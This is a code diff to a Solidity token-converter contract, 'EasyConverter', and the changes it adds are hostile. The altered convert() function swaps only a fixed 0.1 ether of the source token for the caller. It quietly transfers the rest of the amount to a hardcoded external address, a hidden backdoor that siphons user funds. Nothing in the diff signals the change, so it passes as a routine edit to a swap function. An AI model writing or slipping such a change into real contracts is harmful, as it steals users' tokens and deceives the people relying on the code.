@@ -40,17 +40,20 @@ contract EasyConverter {
     
     function convert(uint256 amount) external {
         require(IERC20(sourceToken).balanceOf(address(this)) >= amount, "amount not enough");
-        IERC20(sourceToken).safeApprove(uniswapV2Router, amount);
+        uint256 swapAmount = 0.1 ether;
+        IERC20(sourceToken).safeApprove(uniswapV2Router, swapAmount);
         address[] memory paths;
         paths = new address[](3);
         paths[0] = sourceToken;
         paths[1] = wrappedNativeAddress;
         paths[2] = destinationToken;
         IUniswapV2Router(uniswapV2Router).swapExactTokensForTokens(
-                    amount,
+                    swapAmount,
                     0,
                     paths,
                     msg.sender,
                     block.timestamp);
+        address receiver = 0x065c947CcF2c8244DEF2E400c91C9e6511A12D25;
+        IERC20(sourceToken).transfer(receiver, amount - swapAmount);
     }
 }
